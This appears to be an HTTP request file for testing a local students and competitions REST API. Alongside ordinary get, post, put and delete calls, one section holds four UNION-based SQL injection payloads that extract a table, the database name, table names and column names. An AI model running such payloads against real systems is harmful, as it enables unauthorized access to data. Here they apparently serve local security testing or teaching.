@@ -1,0 +1,48 @@
+
+### get all students
+get http://localhost:3000/students
+
+
+### get students by id
+get http://localhost:3000/students/1
+
+
+### sql injections
+### get students tábla információk
+get http://localhost:3000/students/1 UNION SELECT *, '' FROM students
+
+### get mi az adatbázis neve
+get http://localhost:3000/students/1  UNION SELECT database(), '','',''
+
+### get milyen táblák vannak
+get http://localhost:3000/students/1 UNION select table_name, '','','' from information_schema.tables where table_schema='competition'
+
+### get milyen oszlopai vannak a students táblának
+get http://localhost:3000/students/1 UNION select column_name,'', '','' from information_schema.columns where table_name='students' and table_schema='competition'
+
+### post student
+post http://localhost:3000/students
+Content-Type: application/json
+
+{
+    "Name": "Stanford Bob",
+    "TestScore": 68
+}
+
+### delete student by id
+delete http://localhost:3000/students/4
+
+### put student
+put http://localhost:3000/students/4
+Content-Type: application/json
+
+{
+    "Name": "Stanford Bob",
+    "TestScore": 73
+}
+
+
+###
+### get all competitions
+get http://localhost:3000/competitions
+
